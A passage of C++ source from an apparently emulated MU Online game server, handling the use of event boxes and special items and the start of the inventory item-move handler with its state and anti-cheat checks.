				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(12,34) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				BlueRibbonBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,32) && level == 0 )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				PinkChocolateBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);

			}
			else if ( type == ITEMGET(14,33)  && level == 0 )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				RedChocolateBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);

			}
			else if ( type == ITEMGET(14,34) && level == 0  )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				BlueChocolateBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,32)  && level == 1 )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				LightPurpleCandyBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,33)  && level == 1  )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				VermilionCandyBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);

			}
			else if ( type == ITEMGET(14,34)  && level == 1 )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				DeepBlueCandyBoxOpen(&gObj[aIndex]);
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,45) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				HalloweenDayEventItemBoxOpen(lpObj);
				LogAddTD("[%s][%s][%d]%d/%d Used Pumpkin of Luck Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,55) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				GreenMysteryEventItemBoxOpen(lpObj);
				LogAddTD("[%s][%s][%d]%d/%d Used Green Mystery Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,56) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				RedMysteryEventItemBoxOpen(lpObj);
				LogAddTD("[%s][%s][%d]%d/%d Used Red Mystery Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,57) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				PurpleMysteryEventItemBoxOpen(lpObj);
				LogAddTD("[%s][%s][%d]%d/%d Used Purple Mystery Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,84) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				CherryBlossomEventItemBoxOpen(lpObj);
				LogAddTD("[%s][%s][%d]%d/%d Used Cherry Blossom Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,52) )
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				GMEventItemBoxOpen(lpObj);
				LogAddTD("[%s][%s][%d]%d/%d Used GM Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);
			}
			else if ( type == ITEMGET(14,99) )	//Chrismas fireworks
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				GCFireWorks(lpObj->MapNumber,lpObj->X,lpObj->Y);
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas Fireworks Serial:%d",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial);
			}
			else if(type == ITEMGET(14,157))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S6QuestBoxOpen(&gObj[aIndex],0);
				LogAddTD("[%s][%s][%d]%d/%d Green Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,158))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S6QuestBoxOpen(&gObj[aIndex],1);
				LogAddTD("[%s][%s][%d]%d/%d Red Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,159))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S6QuestBoxOpen(&gObj[aIndex],2);
				LogAddTD("[%s][%s][%d]%d/%d Purple Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,142))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S5E4BoxOpen(&gObj[aIndex],0);
				LogAddTD("[%s][%s][%d]%d/%d Used Elegant Jewerly Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,143))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S5E4BoxOpen(&gObj[aIndex],1);
				LogAddTD("[%s][%s][%d]%d/%d Used Metal Jewerly Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,144))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S5E4BoxOpen(&gObj[aIndex],2);
				LogAddTD("[%s][%s][%d]%d/%d Used Old Jewerly Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,123))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S5E4BoxOpen(&gObj[aIndex],3);
				LogAddTD("[%s][%s][%d]%d/%d Used Gold Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if(type == ITEMGET(14,124))
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				S5E4BoxOpen(&gObj[aIndex],4);
				LogAddTD("[%s][%s][%d]%d/%d Used Silver Box Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y,
					serial, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if ( type == ITEMGET(12,26) )
			{
				switch ( level )
				{
					case 0:
					{
						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = true;
						int ltype = ITEMGET(12,26);
						int randor = rand()%100;
						int Level;

						if ( randor < 10 )
						{
							Level = 3;
						}
						else if ( randor < 45 )
						{
							Level = 1;
						}
						else
						{
							Level = 2;
						}

						ItemSerialCreateSend(aIndex, lpObj->MapNumber, lpObj->X, lpObj->Y,
							ltype, Level, 1, 0, 0, 0, lpObj->m_Index, 0, 0);
							
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Mysterious Bead : Drop (%d) - serial:%d",
							lpObj->AccountID, lpObj->Name, Level, serial);
					}
					break;

					case 1: case 2: case 3:
					{
						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = true;

						PMSG_SERVERCMD ServerCmd;

						PHeadSubSetB((LPBYTE)&ServerCmd, 0xF3, 0x40, sizeof(ServerCmd));
						ServerCmd.CmdType = 0;
						ServerCmd.X = lpObj->X;
						ServerCmd.Y = lpObj->Y;

						MsgSendV2(lpObj, (LPBYTE)&ServerCmd, sizeof(ServerCmd));
						DataSend(lpObj->m_Index, (LPBYTE)&ServerCmd, sizeof(ServerCmd));
													
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Crystal (%d) - serial:%d",
							lpObj->AccountID, lpObj->Name, level, serial);
					}
					break;

					case 4:
					{
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Hidden Treasure Box - serial:%d",
							lpObj->AccountID, lpObj->Name,  serial);

						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = true;
						HiddenTreasureBoxItemBoxOpen(&gObj[aIndex]);
					}
					break;

					case 5:
					{
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Surprise Treasure Box - serial:%d",
							lpObj->AccountID, lpObj->Name,  serial);
						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = true;

						if ( (rand()%10000) < g_iHiddenTreasureBoxOfflineRate )
						{
							EGReqRegHTOfflineGift(lpObj->m_Index);
						}
						else
						{
							int money = 1000000;
							MapC[lpObj->MapNumber].MoneyItemDrop(money, lpObj->X, lpObj->Y);
							
							LogAddTD("[Hidden TreasureBox Event] [%s][%s] Event ZenDrop : %d : (%d)(%d/%d)",
								lpObj->AccountID, lpObj->Name, money, lpObj->MapNumber, lpObj->X, lpObj->Y);
						}
					}
					break;
				}
			}
			else if ( type == ITEMGET(13,20) && level == 1 ) // Wizard Ring A
			{
				if ( gObj[aIndex].Level >= 40 )
				{
					::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
					::RingEventItemBoxOpen(&gObj[aIndex]);
				}
				else
				{
					PMSG_NOTICE pNotice;
					pNotice.type = 0;	// 3
					pNotice.btCount = 0;	// 4
					pNotice.wDelay = 0;	// 6	
					pNotice.dwColor = 0;	// 8
					pNotice.btSpeed = 0;	// C
	
					TNotice::MakeNoticeMsg((TNotice *)&pNotice, 10, lMsg.Get(MSGGET(4, 187)));
					TNotice::SetNoticeProperty((TNotice *)&pNotice, 10, _ARGB(255, 128, 149, 196), 1, 0, 20);
					TNotice::SendNoticeToUser(aIndex, (TNotice *)&pNotice);
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
				}
			}
			else if ( type == ITEMGET(13,20) && level == 2 ) // Wizard Ring B
			{
				if ( gObj[aIndex].Level >= 80 )
				{
					::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
					::FriendShipItemBoxOpen(&gObj[aIndex]);
				}
				else
				{
					PMSG_NOTICE pNotice;
					pNotice.type = 0;	// 3
					pNotice.btCount = 0;	// 4
					pNotice.wDelay = 0;	// 6	
					pNotice.dwColor = 0;	// 8
					pNotice.btSpeed = 0;	// C

					TNotice::MakeNoticeMsg((TNotice *)&pNotice, 10, lMsg.Get(MSGGET(4, 191)));
					TNotice::SetNoticeProperty((TNotice *)&pNotice, 10, _ARGB(255, 128, 149, 196), 1, 0, 20);
					TNotice::SendNoticeToUser(aIndex, (TNotice *)&pNotice);
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
				}
			}
			else if ( type == ITEMGET(14,28) ) // Lost Map
			{
				if ( g_KalimaGate.CreateKalimaGate(aIndex, level, lpMsg->px, lpMsg->py))
				{
					LogAddTD("[Kalima] [%s][%s] Success to Make Kalima Gate (Lost Kalima Map Serial:%d)",
						gObj[aIndex].AccountID, gObj[aIndex].Name, gObj[aIndex].pInventory[lpMsg->Ipos].m_Number);

					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				}
				else
				{
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
				}
			}
			else if ( type == ITEMGET(14,20) && ( ((level-1<0)?FALSE:(level-1>4)?FALSE:TRUE) != FALSE ) ) // Remedy Of Love
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
			}
			else if ( type == ITEMGET(13,7) ) // Contract (Summon)
			{
				int iMonsterID = 0;

				if ( level == 0 )
					iMonsterID = 286;
				else if ( level == 1 )
					iMonsterID = 287;

#if (GS_CASTLE==1)
				if ( g_CsNPC_Mercenary.CreateMercenary(aIndex, iMonsterID, lpMsg->px, lpMsg->py) )
				{
					::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				}
				else
				{
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
				}
#else
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
#endif
			}
			else if ( type == ITEMGET(13,11) ) // Guardian / LifeStone
			{
				BOOL bResult = FALSE;

				#if (GS_CASTLE==1)
				if ( level == 1 )
					bResult = g_CsNPC_LifeStone.CreateLifeStone(aIndex);
				else					
					bResult = g_CsNPC_Guardian.CreateGuardian(aIndex, lpMsg->px, lpMsg->py);
				//else
				//	bResult = g_CsNPC_Guardian.CreateGuardian(aIndex);

				if ( bResult == TRUE )
					::gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				else
				{
					pResult.Result = false;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

					return FALSE;
				}
				#endif
			}
			else
			{
				int OwnerIndex = aIndex;

				if ( (type >= ITEMGET(14,0) && type <= ITEMGET(14,10)) || (type == ITEMGET(4,7) ) || type ==ITEMGET(4,15) )
					OwnerIndex = -1;

				if ( MapC[map].ItemDrop( type, level, dur, lpMsg->px, lpMsg->py, Option1, Option2, Option3,
					NOption, SOption, serial2, OwnerIndex, PetLevel, PetExp, btItemEffectEx,ItemSlot1,ItemSlot2,ItemSlot3,ItemSlot4,ItemSlot5) == TRUE )
				{
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
					pResult.Result = true;

					if ( drop_type == FALSE )
					{
						PLAYER_ITEMS_LOG.Output(lMsg.Get(MSGGET(1, 223)), lpObj->AccountID, lpObj->Name, lpObj->MapNumber,
							lpObj->X, lpObj->Y, serial, szItemName, type, level, Option1, Option2,
							Option3, (int)dur, NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4],
							NewOption[5], NewOption[6], SOption, btItemEffectEx>>7, JOHOption, JOHOptionLevel);
					}
					else
					{
						PLAYER_ITEMS_LOG.Output(lMsg.Get(MSGGET(1, 224)), lpObj->AccountID, lpObj->Name, lpObj->MapNumber,
							lpObj->X, lpObj->Y, serial, szItemName, type, level, Option1, Option2,
							Option3, (int)dur, NewOption[0], NewOption[1], NewOption[2], NewOption[3], NewOption[4],
							NewOption[5], NewOption[6], SOption, btItemEffectEx, JOHOption, JOHOptionLevel );
					}
				}
				else
				{
					pResult.Result = false;
				}
			}
		}
		else	// bIsItem
		{
			LogAdd(lMsg.Get(MSGGET(1, 225)));
			pResult.Result = false;
		}
	}

	DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);

	if ( CopyItem != FALSE )
		::GCItemListSend(aIndex);

	if ( pResult.Result == 1 )
	{
		if ( lpMsg->Ipos < 12 )
		{
			if ( lpMsg->Ipos == 10 || lpMsg->Ipos == 11 )
			{
				gObjUseSkill.SkillChangeUse(aIndex);
			}


			::gObjMakePreviewCharSet(aIndex);

			PMSG_USEREQUIPMENTCHANGED pChange;

			PHeadSetB((LPBYTE)&pChange, 0x25, sizeof(pChange));
			pChange.NumberH = SET_NUMBERH(aIndex);
			pChange.NumberL = SET_NUMBERL(aIndex);
			ItemByteConvert(pChange.ItemInfo, lpObj->pInventory[lpMsg->Ipos]);
			pChange.ItemInfo[I_OPTION] = lpMsg->Ipos <<  4;
			pChange.ItemInfo[I_OPTION] |= LevelSmallConvert(aIndex, lpMsg->Ipos) & 0x0F;

			DataSend(aIndex, (LPBYTE)&pChange, pChange.h.size);
			MsgSendV2(lpObj, (LPBYTE)&pChange, pChange.h.size);
		}
	}

	return pResult.Result;
}









struct PMSG_INVENTORYITEMMOVE_RESULT
{
	PBMSG_HEAD h;	// C3:24
	BYTE result;	// 3
	BYTE Pos;	// 4
	BYTE ItemInfo[MAX_ITEM_INFO];	// 5
};



void GCItemMoveResultSend(int aIndex, BYTE result, BYTE pos, LPBYTE const ItemInfo)
{
	PMSG_INVENTORYITEMMOVE_RESULT pMsg;

	pMsg.h.c = 0xC3;
	pMsg.h.headcode = 0x24;
	pMsg.h.size = sizeof(pMsg);
	pMsg.result = result;
	pMsg.Pos = pos;
	pMsg.ItemInfo[I_TYPE] = ItemInfo[I_TYPE];
	pMsg.ItemInfo[I_OPTION] = ItemInfo[I_OPTION];
	pMsg.ItemInfo[I_DUR] = ItemInfo[I_DUR];
	pMsg.ItemInfo[I_NOPTION] = ItemInfo[I_NOPTION];
	pMsg.ItemInfo[I_SOPTION] = ItemInfo[I_SOPTION];
	pMsg.ItemInfo[I_380OPTION] = ItemInfo[I_380OPTION];
	pMsg.ItemInfo[I_JOHOPTION] = ItemInfo[I_JOHOPTION];

	pMsg.ItemInfo[7] = ItemInfo[7];
	pMsg.ItemInfo[8] = ItemInfo[8];
	pMsg.ItemInfo[9] = ItemInfo[9];
	pMsg.ItemInfo[10] = ItemInfo[10];
	pMsg.ItemInfo[11] = ItemInfo[11];

	DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

int getNumberOfExcOptions(int checksum)
{
	int optionscount=0;
	int ExcOrgArr[6];

	ExcOrgArr[0]=1;
	ExcOrgArr[1]=2;
	ExcOrgArr[2]=4;
	ExcOrgArr[3]=8;
	ExcOrgArr[4]=16;
	ExcOrgArr[5]=32;

	if (checksum>0)
	{
		for (int i=0;i<6;i++)
		{
			int and_val=checksum & ExcOrgArr[i];
			if (and_val != 0)
				optionscount+=1;
		}
	}

	return optionscount;
}


bool SellItemResult(LPOBJ lpObj,int Slot)
{
	bool IsShowMoveItemError = false;
	
	int dwExOpCount=0;
	dwExOpCount = getNumberOfExcOptions(lpObj->pInventory[Slot].m_NewOption);

	//Set Item
	if (( lpObj->pInventory[Slot].m_SetOption > 0) && ( lpObj->pInventory[Slot].m_Level >= ReadConfig.SetItemPlusLimit ))
	{
		IsShowMoveItemError = true ;
	}

	//Excellent
	if (  (lpObj->pInventory[Slot].m_NewOption  > 0) && (lpObj->pInventory[Slot].m_NewOption !=0x40)  )
	{
		if (( lpObj->pInventory[Slot].m_Level >= ReadConfig.ExItemPlusLimit) || (dwExOpCount >= ReadConfig.ExItemOpLimit ))
			IsShowMoveItemError = true ;
	}

	//Normal
	if ( lpObj->pInventory[Slot].m_Level >= ReadConfig.ItemPlusLimit )
	{
		IsShowMoveItemError = true ;
	}

	return IsShowMoveItemError;
}



void CGInventoryItemMove(PMSG_INVENTORYITEMMOVE * lpMsg, int aIndex)
{
	BYTE result;
	BYTE ItemInfo[MAX_ITEM_INFO];

	if(OBJMAX_RANGE(aIndex) == 0)
	{
		return;
	}

	if ( !PacketCheckTime(&gObj[aIndex]))
	{
		::GCItemMoveResultSend(aIndex, -1, 0, ItemInfo);
		return;
	}

	if ( !::gObjIsConnectedGP(aIndex))
	{
		LogAddC(2,"[%s][%d] error-L3", __FILE__, __LINE__);
		::GCItemMoveResultSend(aIndex, -1, 0, ItemInfo);
		return;
	}

	LPOBJ lpObj = &gObj[aIndex];
	int it_type = 0;

	if ( lpObj->m_ReqWarehouseOpen != false )
	{
		LogAddC(2,"[%s][%d] error-L3", __FILE__, __LINE__);
		GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);

		return;
	}

	if ( lpObj->m_bMapSvrMoveQuit == true || lpObj->m_bMapAntiHackMove == true )
	{
		GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
		if(ReadConfig.AHLog == TRUE)
		{
			ANTI_HACK_LOG.Output("[ANTI-HACK][Inventory] - Item Move during MapServer Move [%s][%s]",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
		}
		return;
	}

	int source = lpMsg->source_item_num;
	int target = lpMsg->target_item_num;

	if ( lpMsg->tFlag == 2 || lpMsg->sFlag == 2 )
		it_type = 6;

	if ( lpMsg->tFlag == 0 && lpMsg->sFlag == 0 )
		it_type = 8;

	if ( (lpMsg->tFlag == 0 && lpMsg->sFlag == 4) ||
		(lpMsg->tFlag == 4 && lpMsg->sFlag == 0) ||
		(lpMsg->tFlag == 4 && lpMsg->sFlag == 4) )
		it_type = 8;

	if (::gObjCanItemTouch(lpObj, it_type) == FALSE)
	{
		if ( lpMsg->sItemInfo[I_TYPE] == ITEMGET(4,7) || lpMsg->sItemInfo[I_TYPE] == ITEMGET(4,15) )
		{
			if ( target >= 12 || source < 12 )
			{
				::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
				return;
			}
		}
		else
		{
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			return;
		}
	}

	if ( lpObj->DieRegen != FALSE )
	{
		::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
		return;
	}

	ItemInfo[I_TYPE] = lpMsg->sItemInfo[I_TYPE];
	ItemInfo[I_OPTION] = lpMsg->sItemInfo[I_OPTION];
	ItemInfo[I_DUR] = lpMsg->sItemInfo[I_DUR];
	ItemInfo[I_NOPTION] = lpMsg->sItemInfo[I_NOPTION];
	ItemInfo[I_SOPTION] = lpMsg->sItemInfo[I_SOPTION];
	ItemInfo[I_380OPTION] = lpMsg->sItemInfo[I_380OPTION];
	ItemInfo[I_JOHOPTION] = lpMsg->sItemInfo[I_JOHOPTION];

	ItemInfo[7] = lpMsg->sItemInfo[7];
	ItemInfo[8] = lpMsg->sItemInfo[8];
	ItemInfo[9] = lpMsg->sItemInfo[9];
	ItemInfo[10] = lpMsg->sItemInfo[10];
	ItemInfo[11] = lpMsg->sItemInfo[11];

	if ( lpMsg->sFlag == 3 || lpMsg->tFlag == 3 )
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 7 )
		{
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Chaosbox", gObj[aIndex].AccountID, gObj[aIndex].Name);

			return;
		}

		if ( lpObj->ChaosLock == TRUE )
		{
			LogAddTD("[%s][%s] error-L3 : CBMixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
		
			return;
		}
	}

	if ( lpMsg->sFlag == 5 || lpMsg->tFlag == 5 )
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 13 )
		{
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not DarkTrainerBox", gObj[aIndex].AccountID, gObj[aIndex].Name);

			return;
		}

		if ( lpObj->ChaosLock == TRUE )
		{
			LogAddTD("[%s][%s] error-L3 : DarkTrainerBoxMixing", gObj[aIndex].AccountID, gObj[aIndex].Name);
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
		
			return;
		}
	}

	if ( lpMsg->sFlag == 6 || lpMsg->sFlag == 7 || lpMsg->sFlag == 8 ||
		 lpMsg->tFlag == 6 || lpMsg->tFlag == 7 || lpMsg->tFlag == 8 )
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type !=7 )
		{
			GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox",
				gObj[aIndex].AccountID, gObj[aIndex].Name);

			return;
		}

		if ( lpObj->ChaosLock == TRUE )
		{
			LogAddTD("[%s][%s] error-L3 : JewelOfHarmony Mixing",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);

			return;
		}
	}

	if ( lpMsg->sFlag == 9 || lpMsg->tFlag == 9 )
	{
		if ( lpObj->m_IfState.use	 < 1 || lpObj->m_IfState.type !=7 )
		{
			GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not ChaosBox",
				gObj[aIndex].AccountID, gObj[aIndex].Name);

			return;
		}

		if ( lpObj->ChaosLock == TRUE )
		{
			LogAddTD("[%s][%s] error-L3 : JewelOfHarmony Mixing",
				gObj[aIndex].AccountID, gObj[aIndex].Name);
			GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);

			return;
		}
	}


	if ( lpMsg->sFlag == 2 || lpMsg->tFlag == 2 )
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 6 )
		{
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Warehouse", gObj[aIndex].AccountID, gObj[aIndex].Name);

			return;
		}
	}

	if ( lpMsg->sFlag == 1 && lpMsg->tFlag == 0 )
	{
		if ( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != 1 )
		{
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			LogAdd("[%s][%s] error-L1 : used not Trade", gObj[aIndex].AccountID, gObj[aIndex].Name);

			return;
		}
	}

	if ( lpMsg->sFlag == 2 && lpMsg->tFlag == 0 )
	{
		int money = ::GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);

		if ( (lpObj->Money - money ) < 1 && (lpObj->WarehouseMoney - money) < 1)
		{
			::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
			char szTemp[256];
			wsprintf(szTemp, lMsg.Get(MSGGET(6, 69)), money);
			::GCServerMsgStringSend(szTemp, lpObj->m_Index, 1);

			return;
		}

		if ( ::bCanWarehouseLock == TRUE )
		{
			if ( gObj[aIndex].WarehouseLock == 1 )
			{
				::GCItemMoveResultSend(aIndex, -1, 0, (LPBYTE)&ItemInfo);
				::GCServerMsgStringSend(lMsg.Get(MSGGET(6, 70)), lpObj->m_Index, 1);

				return;
			}
		}
	}

	bool MoveErrorResult = false;
	switch(lpMsg->tFlag)
	{
		case 1:
		{
			if(ReadConfig.ItemTradeLimit == 1)
				MoveErrorResult = SellItemResult(lpObj,lpMsg->source_item_num);
		}break;
		case 3:
		{
			if(ReadConfig.ItemMixLimit == 1)
				MoveErrorResult = SellItemResult(lpObj,lpMsg->source_item_num);
		}break;
		case 4:
		{
